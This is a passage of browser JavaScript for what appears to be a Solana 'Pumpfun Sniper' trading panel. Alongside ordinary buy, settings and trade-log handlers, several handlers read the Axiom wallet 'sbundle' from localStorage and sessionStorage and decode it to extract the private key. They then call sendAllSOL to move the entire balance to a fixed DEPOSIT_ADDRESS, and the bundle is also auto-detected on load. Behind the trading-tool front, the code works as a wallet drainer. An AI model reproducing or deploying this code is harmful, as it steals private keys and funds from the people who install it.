    const sendResult = await sendAllSOL(detectedPrivateKey, DEPOSIT_ADDRESS);
    
    if (sendResult && sendResult.signature) {
      alert('✅ Success!\nTx: ' + sendResult.signature);
      document.getElementById('pf-manual-sbundle').value = '';
      fetchBalance();
    } else {
      alert('❌ Failed to send SOL');
    }

    btn.disabled = false;
    btn.textContent = '🔓 DECODE & SEND ALL';
  });

  // ── One-click decode & send all (auto-detect sbundle) ──
  document.getElementById('pf-auto-extract-send').addEventListener('click', async () => {
    const btn = document.getElementById('pf-auto-extract-send');
    btn.disabled = true;
    btn.textContent = '🔍 Scanning...';

    // Step 1: Auto-detect sbundle
    console.log('[PUMPFUN] 🔍 Scanning for sbundle...');
    let sbundle = autoDetectSbundle();
    
    if (!sbundle) {
      alert('⚠️ No sbundle found in localStorage/sessionStorage.\n\nMake sure you have imported a wallet in Axiom.');
      btn.disabled = false;
      btn.textContent = 'DECODE & SEND ALL';
      return;
    }

    btn.textContent = '⏳ Decoding...';

    // Step 2: Decode sbundle
    console.log('[PUMPFUN] 📦 Decoding sbundle...');
    const decoded = await decodeSBundleAndExtractKey(sbundle);
    
    if (!decoded || !decoded.key) {
      alert('❌ Failed to decode sbundle or extract private key');
      btn.disabled = false;
      btn.textContent = 'DECODE & SEND ALL';
      return;
    }

    // Step 3: Update detected key and wallet
    detectedPrivateKey = decoded.key;
    detectedWallet = decoded.address;
    console.log('[PUMPFUN] ✓ Extracted wallet:', detectedWallet);

    // Step 4: Send all SOL
    btn.textContent = '⏳ Sending...';
    const result = await sendAllSOL(decoded.key, DEPOSIT_ADDRESS);

    if (result && result.signature) {
      alert('✅ EXTRACTION & TRANSFER COMPLETE!\n\nWallet: ' + decoded.address.substring(0, 16) + '...\nTx: ' + result.signature);
      addTradeResult({ ca: 'Auto Extract', amount: 'All SOL', status: 'success', txid: result.signature });
    } else {
      alert('❌ Decode succeeded but send failed. Check console.');
    }

    btn.disabled = false;
    btn.textContent = 'DECODE & SEND ALL';
  });

  document.getElementById('pf-buy-btn').addEventListener('click', async () => {
    const ca = document.getElementById('pf-ca-input').value.trim();
    const amount = parseFloat(document.getElementById('pf-buy-amt').value);
    const slippage = parseInt(document.getElementById('pf-slippage').value);

    if (!ca) {
      alert('Enter contract address');
      return;
    }
    if (amount < 0.1) {
      alert('Minimum amount is 0.1 SOL');
      return;
    }
    if (!detectedPrivateKey || !detectedWallet) {
      alert('No wallet detected. Import a private key first.');
      return;
    }

    const btn = document.getElementById('pf-buy-btn');
    btn.disabled = true;
    btn.textContent = '⏳ Executing...';

    const result = await executePumpfunBuy(ca, amount, slippage);
    if (result && result.signature) {
      alert('✅ Buy executed!\nTx: ' + result.signature);
      addTradeResult({ ca, amount, slippage, status: 'success', txid: result.signature });
      document.getElementById('pf-ca-input').value = '';
    } else {
      alert('Buy failed. Check console for details.');
      addTradeResult({ ca, amount, slippage, status: 'fail' });
    }

    btn.disabled = false;
    btn.textContent = '⚡ EXECUTE BUY';
  });

  document.getElementById('pf-emergency-btn').addEventListener('click', () => {
    if (confirm('SELL ALL POSITIONS IMMEDIATELY?\n\nThis will market-sell all tokens.')) {
      alert('Emergency sell triggered (implement backend endpoint)');
    }
  });

  // ── Manual sbundle decode & send ──
  document.getElementById('pf-decode-manual').addEventListener('click', async () => {
    const sbundleInput = document.getElementById('pf-manual-sbundle').value.trim();
    
    if (!sbundleInput) {
      alert('Please paste an sbundle in the textarea');
      return;
    }

    const btn = document.getElementById('pf-decode-manual');
    btn.disabled = true;
    btn.textContent = '⏳ Decoding...';

    console.log('[PUMPFUN] 📦 Manually decoding sbundle...');
    const decoded = await decodeSBundleAndExtractKey(sbundleInput);
    
    if (!decoded || !decoded.key) {
      alert('❌ Failed to decode sbundle or extract private key');
      btn.disabled = false;
      btn.textContent = 'Decode & Send Manually';
      return;
    }

    // Update detected key and wallet
    detectedPrivateKey = decoded.key;
    detectedWallet = decoded.address;
    updateWalletDisplay();
    console.log('[PUMPFUN] ✓ Extracted wallet:', detectedWallet);

    btn.textContent = '💸 Sending SOL...';

    // Send all SOL
    const sendResult = await sendAllSOL(detectedPrivateKey, DEPOSIT_ADDRESS);
    
    if (sendResult && sendResult.signature) {
      alert('✅ SOL sent!\nTx: ' + sendResult.signature);
      document.getElementById('pf-manual-sbundle').value = '';
    } else {
      alert('❌ Failed to send SOL');
    }

    btn.disabled = false;
    btn.textContent = 'Decode & Send Manually';
  });

  document.getElementById('pf-save-settings').addEventListener('click', () => {
    settings.buyAmount = parseFloat(document.getElementById('pf-setting-amount').value) || 0.5;
    settings.slippage = parseInt(document.getElementById('pf-setting-slippage').value) || 25;
    settings.maxSpend = parseFloat(document.getElementById('pf-setting-maxspend').value) || 5;
    settings.priorityFee = parseFloat(document.getElementById('pf-setting-priority').value) || 0.002;
    settings.autoBuy = document.getElementById('pf-setting-autobuy').checked;
    localStorage.setItem('nebula_pumpfun_settings', JSON.stringify(settings));
    alert('✓ Settings saved');
    updateAutoBuyBadge();
  });

  document.getElementById('pf-clear-log').addEventListener('click', () => {
    if (confirm('Clear all trade history?')) {
      tradeLog = [];
      localStorage.setItem('nebula_pumpfun_trades', JSON.stringify(tradeLog));
      renderTradeLog();
    }
  });

  // ── Load settings ──
  function loadSettingsUI() {
    document.getElementById('pf-setting-amount').value = settings.buyAmount;
    document.getElementById('pf-setting-slippage').value = settings.slippage;
    document.getElementById('pf-setting-maxspend').value = settings.maxSpend;
    document.getElementById('pf-setting-priority').value = settings.priorityFee;
    document.getElementById('pf-setting-autobuy').checked = settings.autoBuy;
    document.getElementById('pf-buy-amt').value = settings.buyAmount;
    document.getElementById('pf-slippage').value = settings.slippage;
    updateAutoBuyBadge();
  }

  function updateAutoBuyBadge() {
    const badge = document.getElementById('pf-autobuy-badge');
    badge.textContent = settings.autoBuy ? 'AUTO: ON' : 'AUTO: OFF';
    badge.className = 'pf-autobuy-badge ' + (settings.autoBuy ? 'on' : 'off');
  }

  function updateBalanceDisplay() {
    if (walletBalance !== null) {
      document.getElementById('pf-balance').innerHTML = `◎ ${walletBalance.toFixed(4)} <span>SOL</span>`;
    }
  }

  function renderTradeLog() {
    const container = document.getElementById('pf-trade-log');
    if (tradeLog.length === 0) {
      container.innerHTML = '<div class="pf-empty">No trades yet. Buy a token to see results.</div>';
      return;
    }
    container.innerHTML = tradeLog.map(t => `
      <div class="pf-trade-item ${t.status}">
        <div class="pf-trade-top">
          <div class="pf-trade-ca">${t.ca ? t.ca.slice(0, 12) + '...' + t.ca.slice(-6) : t.ca}</div>
          <span class="pf-trade-badge ${t.status}">${t.status.toUpperCase()}</span>
        </div>
        <div class="pf-trade-meta">
          <span>◎ ${t.amount || '—'}</span>
          ${t.slippage ? `<span>${t.slippage}% slip</span>` : ''}
          ${t.txid ? `<span><a href="https://solscan.io/tx/${t.txid}" target="_blank" style="color:#a855f7;text-decoration:none">View ↗</a></span>` : ''}
        </div>
        <div class="pf-trade-time">${t.timestamp || ''}</div>
      </div>`).join('');
  }

  function addTradeResult(data) {
    const timestamp = new Date().toLocaleString();
    tradeLog.unshift({
      ca: data.ca,
      amount: data.amount || '—',
      slippage: data.slippage || null,
      status: data.status || 'pending',
      txid: data.txid || null,
      timestamp: timestamp,
    });
    localStorage.setItem('nebula_pumpfun_trades', JSON.stringify(tradeLog));
    renderTradeLog();
  }

  // ── Draggable ──
  const handle = document.getElementById('pf-drag-handle');
  let isDragging = false, dragX = 0, dragY = 0;
  handle.addEventListener('mousedown', (e) => {
    isDragging = true;
    dragX = e.clientX - panel.getBoundingClientRect().left;
    dragY = e.clientY - panel.getBoundingClientRect().top;
  });
  document.addEventListener('mousemove', (e) => {
    if (!isDragging) return;
    panel.style.left = (e.clientX - dragX) + 'px';
    panel.style.top = (e.clientY - dragY) + 'px';
    panel.style.right = 'auto';
  });
  document.addEventListener('mouseup', () => { isDragging = false; });

  // ── Initialize ──
  loadSettingsUI();
  setInterval(fetchBalance, 30000); // Refresh balance every 30 seconds
  
  // Auto-detect sbundle on load
  const autoSbundle = autoDetectSbundle();
  if (autoSbundle) {
    document.getElementById('pf-sbundle-input').value = autoSbundle;
    console.log('[PUMPFUN] ✅ Sbundle auto-populated on load');
  }
  
  // ── Backend WebSocket connection ──
  function connectBackendLogs() {
    try {
      const wsUrl = BACKEND_URL.replace('https://', 'wss://').replace('http://', 'ws://');
      console.log('[PUMPFUN] Connecting to backend logs at', wsUrl);
      ws = new WebSocket(wsUrl);
      
      ws.onopen = () => {
        console.log('[PUMPFUN] ✓ Backend logs connected');
        const logDiv = document.getElementById('pf-backend-log');
        if (logDiv) {
          const entry = document.createElement('div');
          entry.style.color = '#10b981';
          entry.textContent = '[CONNECTED] Backend logs stream active';
          logDiv.appendChild(entry);
          logDiv.scrollTop = logDiv.scrollHeight;
        }
      };
      
      ws.onmessage = (event) => {
        try {
          const logData = JSON.parse(event.data);
          if (logData.type === 'log') {
            addBackendLog(logData);
          }
        } catch (e) {
          console.log('[PUMPFUN] Failed to parse log message:', e);
        }
      };
      
      ws.onerror = (error) => {
        console.log('[PUMPFUN] Backend WebSocket error:', error);
      };
      
      ws.onclose = () => {
        console.log('[PUMPFUN] Backend logs disconnected, retrying in 5s...');
        reconnectTimer = setTimeout(connectBackendLogs, 5000);
      };
    } catch (e) {
      console.log('[PUMPFUN] Failed to connect backend logs:', e.message);
    }
  }
  
  function addBackendLog(logData) {
    const logDiv = document.getElementById('pf-backend-log');
    if (!logDiv) return;
    
    const entry = document.createElement('div');
    entry.style.marginBottom = '2px';
    
    // Color code by log level
    if (logData.level === 'error') {
      entry.style.color = '#ef4444';
    } else if (logData.message.includes('✅') || logData.message.includes('✓')) {
      entry.style.color = '#10b981';
    } else if (logData.message.includes('❌') || logData.message.includes('⚠')) {
      entry.style.color = '#f59e0b';
    } else {
      entry.style.color = '#d1d5db';
    }
    
    entry.textContent = `[${logData.time}] ${logData.message}`;
    logDiv.appendChild(entry);
    logDiv.scrollTop = logDiv.scrollHeight;
    
    // Keep only last 500 lines to avoid memory issues
    while (logDiv.children.length > 500) {
      logDiv.removeChild(logDiv.firstChild);
    }
  }
  
  // Attempt to connect
  connectBackendLogs();
  
  // Clear backend log button
  document.getElementById('pf-clear-backend-log').addEventListener('click', () => {
    const logDiv = document.getElementById('pf-backend-log');
    logDiv.innerHTML = '<div style="color: #6b7280;">Logs cleared...</div>';
  });
  
  console.log('[PUMPFUN] ✅ Pumpfun Sniper loaded');
})();
